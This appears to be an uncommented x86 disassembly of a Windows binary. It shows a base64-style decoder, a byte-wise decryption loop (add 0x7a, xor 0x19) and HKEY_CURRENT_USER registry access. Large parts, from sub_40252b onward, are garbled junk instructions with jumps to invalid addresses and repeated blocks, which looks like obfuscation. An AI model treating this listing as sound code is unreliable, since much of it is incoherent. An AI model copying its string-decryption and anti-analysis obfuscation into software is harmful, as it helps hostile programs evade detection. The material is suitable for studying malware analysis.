mov ch [ eax + 0x2 ]
cmp ch 0x3d
jne r-xdata
cmp dl dh
je r-xdata
mov eax rw-data
mov cl bl
mov edi 0x1
jmp r-xdata
sub eax rw-data
js r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax + 0x3 ]
shl edx 0x6
cmp cl 0x3d
jne r-xdata
add edx eax
mov eax [ ebp - 0x4 ]
cmp cl ch
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
inc edi
cmp edi 0x3
jge r-xdata
mov eax rw-data
cmp edi 0x2
jge r-xdata
jmp r-xdata
sub eax rw-data
js r-xdata
mov bl [ eax + 0x1 ]
inc eax
test bl bl
jne r-xdata
cmp edi 0x1
jge r-xdata
mov eax edx
sar eax 0x8
mov [ esi ] al
inc esi
mov bl [ rw-data ]
mov eax edx
sar eax 0x10
mov [ esi ] al
inc esi
mov bl [ rw-data ]
add edx eax
cmp bl cl
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
add ecx 0x4
mov [ ebp - 0x4 ] ecx
cmp [ ecx ] 0x0
jne r-xdata
mov [ esi ] dl
inc esi
mov bl [ rw-data ]
test edi edi
jne r-xdata
jmp r-xdata
sub_4022c0
push ebp
mov ebp esp
push ecx
push esi
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x0
call sub_402140
mov esi eax
xor ecx ecx
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebp - 0x4 ]
cmp esi 0x20
jb r-xdata
cmp ecx esi
jge r-xdata
and eax 0x8000001f
jns r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
nop
movaps xmm1 [ r--data ]
mov edx esi
movaps xmm2 [ r--data ]
sub edx eax
lea eax [ edi + 0x10 ]
nop [ eax + eax ] ax
dec eax
or eax 0xffffffe0
inc eax
mov dl [ ecx + edi ]
add dl 0x7a
xor dl 0x19
mov [ ecx + edi ] dl
inc ecx
cmp ecx esi
jl r-xdata
movups xmm0 [ eax - 0x10 ]
add ecx 0x20
lea eax [ eax + 0x20 ]
paddb xmm0 xmm1
movups [ eax - 0x30 ] xmm0
movups xmm0 [ eax - 0x30 ]
pxor xmm0 xmm2
movups [ eax - 0x30 ] xmm0
movups xmm0 [ eax - 0x20 ]
paddb xmm0 xmm1
movups [ eax - 0x20 ] xmm0
movups xmm0 [ eax - 0x20 ]
pxor xmm0 xmm2
movups [ eax - 0x20 ] xmm0
cmp ecx edx
jl r-xdata
sub_4023a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a458
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x8
mov [ ebp - 0x10 ] rw-data
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
mov [ rw-data ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov eax [ rw-data ]
mov [ eax ] rw-data
mov [ ebp - 0x4 ] 0x0
push 0x8
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
call sub_413b11
mov [ rw-data ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov eax [ rw-data ]
mov [ eax ] rw-data
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
call sub_413b11
sub_4024d0
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov [ ebp - 0x78 ] r--data
mov [ ebp - 0x74 ] 0x100
mov [ ebp - 0x98 ] 0x2
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x58 ] edx
push esi
push ebp
push esi
call sub_4025b6
retn 0x10
sub_40252b
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe8469683
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x359c87
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
push ebp
push esp
sub esp 0x8
call sub_402557
jae 0x5a7613d1
or ecx 0x30246c81
adc esp [ 0xffffffffec830040 ]
add al 0x73
adc al [ ecx - 0x16fe8c0d ]
push ebx
jmp 0xffffffff83947a9e
push edx
push ebp
sub esp 0xc
call sub_40257c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
or esp [ esi ]
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2c06
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x486491e3
add al [ ebx + 0x77d04ec ]
sub_402557
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x486491e3
push edx
push ebp
sub esp 0xc
call sub_40257c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
or esp [ esi ]
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2c06
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_40257c
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc37ac3
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f2c06
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff84001424
push ebx
call sub_4025a4
jge 0xffffffff844f3010
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_4025d0
jpo 0x59282b46
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3a9b24
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53917a35
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
pushfd
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
lea eax [ ebp + 0x3c ]
movzx ecx ax
lea edx [ ebp - 0x3c ]
cmp ecx edx
je r-xdata
call sub_4025eb
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
or esp [ esi ]
inc eax
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_40257c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
movsx eax [ ebp + 0xcc ]
xor edx edx
mov ecx 0x7bb6
div ecx
mov [ ebp - 0x6c ] edx
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x44 ]
movsx edx cx
not edx
mov [ ebp - 0x6c ] edx
jmp r-xdata
lea eax [ ebp - 0x3c ]
movzx ecx al
mov [ ebp - 0x2c ] ecx
lea edx [ ebp - 0x54 ]
movsx eax [ edx - 0xc ]
not eax
mov [ ebp - 0x70 ] eax
lea eax [ ebp + 0xa0 ]
movzx ecx ax
lea edx [ ebp - 0x54 ]
sub ecx [ edx - 0x18 ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
movsx edx [ ebp + 0x40 ]
cmp [ ebp - 0x6c ] edx
jb r-xdata
mov [ ebp - 0x58 ] 0x400
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x74 ]
or ecx 0xf003f
push ecx
push 0x0
mov edx [ ebp - 0x78 ]
push edx
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x54 ]
add eax 0xfffffff0
cdq
mov ecx 0x78
idiv ecx
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x58 ] 0x400
lea ecx [ ebp - 0x60 ]
push ecx
mov edx [ ebp - 0x74 ]
or edx 0xf003f
push edx
push 0x0
mov eax [ ebp - 0x78 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
movsx ecx [ ebp - 0x1c ]
xor edx edx
sub edx ecx
mov [ ebp - 0x7c ] edx
jmp r-xdata
cmp [ ebp - 0x70 ] 0x57a9
jbe r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp + 0x40 ]
movsx edx cx
xor eax eax
sub eax edx
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x48 ]
movzx ecx al
imul edx ecx 0x54af
mov [ ebp - 0x80 ] edx
jmp r-xdata
lea edx [ ebp + 0x64 ]
cmp [ ebp - 0x7c ] edx
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x1 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x58 ] edx
push esi
push ebx
sub esp 0x10
call sub_402dfe
retn 0x50
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4025b6
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_4025d0
jpo 0x59282b46
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3a9b24
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53917a35
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
pushfd
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
lea eax [ ebp + 0x3c ]
movzx ecx ax
lea edx [ ebp - 0x3c ]
cmp ecx edx
je r-xdata
call sub_4025eb
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_40257c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
or esp [ esi ]
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2c06
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
movsx eax [ ebp + 0xcc ]
xor edx edx
mov ecx 0x7bb6
div ecx
mov [ ebp - 0x6c ] edx
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x44 ]
movsx edx cx
not edx
mov [ ebp - 0x6c ] edx
jmp r-xdata
lea eax [ ebp - 0x3c ]
movzx ecx al
mov [ ebp - 0x2c ] ecx
lea edx [ ebp - 0x54 ]
movsx eax [ edx - 0xc ]
not eax
mov [ ebp - 0x70 ] eax
lea eax [ ebp + 0xa0 ]
movzx ecx ax
lea edx [ ebp - 0x54 ]
sub ecx [ edx - 0x18 ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
movsx edx [ ebp + 0x40 ]
cmp [ ebp - 0x6c ] edx
jb r-xdata
mov [ ebp - 0x58 ] 0x400
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x74 ]
or ecx 0xf003f
push ecx
push 0x0
mov edx [ ebp - 0x78 ]
push edx
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x54 ]
add eax 0xfffffff0
cdq
mov ecx 0x78
idiv ecx
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x58 ] 0x400
lea ecx [ ebp - 0x60 ]
push ecx
mov edx [ ebp - 0x74 ]
or edx 0xf003f
push edx
push 0x0
mov eax [ ebp - 0x78 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
movsx ecx [ ebp - 0x1c ]
xor edx edx
sub edx ecx
mov [ ebp - 0x7c ] edx
jmp r-xdata
cmp [ ebp - 0x70 ] 0x57a9
jbe r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp + 0x40 ]
movsx edx cx
xor eax eax
sub eax edx
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x48 ]
movzx ecx al
imul edx ecx 0x54af
mov [ ebp - 0x80 ] edx
jmp r-xdata
lea edx [ ebp + 0x64 ]
cmp [ ebp - 0x7c ] edx
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x1 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x58 ] edx
push esi
push ebx
sub esp 0x10
call sub_402dfe
retn 0x50
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4025d0
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53917a35
pop eax
jae r-xdata
call 0xe3a9b24
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
pushfd
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
lea eax [ ebp + 0x3c ]
movzx ecx ax
lea edx [ ebp - 0x3c ]
cmp ecx edx
je r-xdata
call sub_4025eb
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
movsx eax [ ebp + 0xcc ]
xor edx edx
mov ecx 0x7bb6
div ecx
mov [ ebp - 0x6c ] edx
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x44 ]
movsx edx cx
not edx
mov [ ebp - 0x6c ] edx
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
lea eax [ ebp - 0x3c ]
movzx ecx al
mov [ ebp - 0x2c ] ecx
lea edx [ ebp - 0x54 ]
movsx eax [ edx - 0xc ]
not eax
mov [ ebp - 0x70 ] eax
lea eax [ ebp + 0xa0 ]
movzx ecx ax
lea edx [ ebp - 0x54 ]
sub ecx [ edx - 0x18 ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
movsx edx [ ebp + 0x40 ]
cmp [ ebp - 0x6c ] edx
jb r-xdata
push edx
push ebp
sub esp 0xc
call sub_40257c
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
or esp [ esi ]
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f2c06
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
mov [ ebp - 0x58 ] 0x400
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x74 ]
or ecx 0xf003f
push ecx
push 0x0
mov edx [ ebp - 0x78 ]
push edx
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x54 ]
add eax 0xfffffff0
cdq
mov ecx 0x78
idiv ecx
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x58 ] 0x400
lea ecx [ ebp - 0x60 ]
push ecx
mov edx [ ebp - 0x74 ]
or edx 0xf003f
push edx
push 0x0
mov eax [ ebp - 0x78 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
movsx ecx [ ebp - 0x1c ]
xor edx edx
sub edx ecx
mov [ ebp - 0x7c ] edx
jmp r-xdata
cmp [ ebp - 0x70 ] 0x57a9
jbe r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp + 0x40 ]
movsx edx cx
xor eax eax
sub eax edx
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x48 ]
movzx ecx al
imul edx ecx 0x54af
mov [ ebp - 0x80 ] edx
jmp r-xdata
lea edx [ ebp + 0x64 ]
cmp [ ebp - 0x7c ] edx
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x1 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x58 ] edx
push esi
push ebx
sub esp 0x10
call sub_402dfe
retn 0x50
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4025eb
jae r-xdata
pop edx
jns 0x5b00166a
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
pushfd
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
lea eax [ ebp + 0x3c ]
movzx ecx ax
lea edx [ ebp - 0x3c ]
cmp ecx edx
je r-xdata
jns r-xdata
movsx eax [ ebp + 0xcc ]
xor edx edx
mov ecx 0x7bb6
div ecx
mov [ ebp - 0x6c ] edx
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x44 ]
movsx edx cx
not edx
mov [ ebp - 0x6c ] edx
jmp r-xdata
lea eax [ ebp - 0x3c ]
movzx ecx al
mov [ ebp - 0x2c ] ecx
lea edx [ ebp - 0x54 ]
movsx eax [ edx - 0xc ]
not eax
mov [ ebp - 0x70 ] eax
lea eax [ ebp + 0xa0 ]
movzx ecx ax
lea edx [ ebp - 0x54 ]
sub ecx [ edx - 0x18 ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
movsx edx [ ebp + 0x40 ]
cmp [ ebp - 0x6c ] edx
jb r-xdata
mov [ ebp - 0x58 ] 0x400
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x74 ]
or ecx 0xf003f
push ecx
push 0x0
mov edx [ ebp - 0x78 ]
push edx
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x54 ]
add eax 0xfffffff0
cdq
mov ecx 0x78
idiv ecx
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x58 ] 0x400
lea ecx [ ebp - 0x60 ]
push ecx
mov edx [ ebp - 0x74 ]
or edx 0xf003f
push edx
push 0x0
mov eax [ ebp - 0x78 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
mov [ ebp - 0x5c ] eax
movsx ecx [ ebp - 0x1c ]
xor edx edx
sub edx ecx
mov [ ebp - 0x7c ] edx
jmp r-xdata
cmp [ ebp - 0x70 ] 0x57a9
jbe r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea ecx [ ebp + 0x40 ]
movsx edx cx
xor eax eax
sub eax edx
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x48 ]
movzx ecx al
imul edx ecx 0x54af
mov [ ebp - 0x80 ] edx
jmp r-xdata
lea edx [ ebp + 0x64 ]
cmp [ ebp - 0x7c ] edx
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x1 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x58 ] edx
push esi
push ebx
sub esp 0x10
call sub_402dfe
retn 0x50
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x5c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_402786
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ec28
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
pushad
daa
inc eax
add [ ebx + 0xf5a10ec ] al
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afa788
pushfd
call sub_402771
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_402786
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c13851
jne r-xdata
call sub_402811
ja 0x504ac18
call 0x52908051
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc6959
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab131
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96ab88
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1e7e1
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x164015cb
pop edx
jg r-xdata
jpo 0xf70a0ee
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0abfa
jne r-xdata
jno 0xffffffff834f7ff5
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fc9c7
jne 0xffffffffeac13121
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c947bfc
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a91b
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jae r-xdata
ja 0xffffffffa3c33a16
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a466b7
push esi
push esi
call sub_4028fc
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd81f3
push edx
call sub_402832
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4cdc7
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_4028b1
xor edi 0x517f5859
jno 0xfffffffff2c1836e
push ecx
push ebx
call sub_402801
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
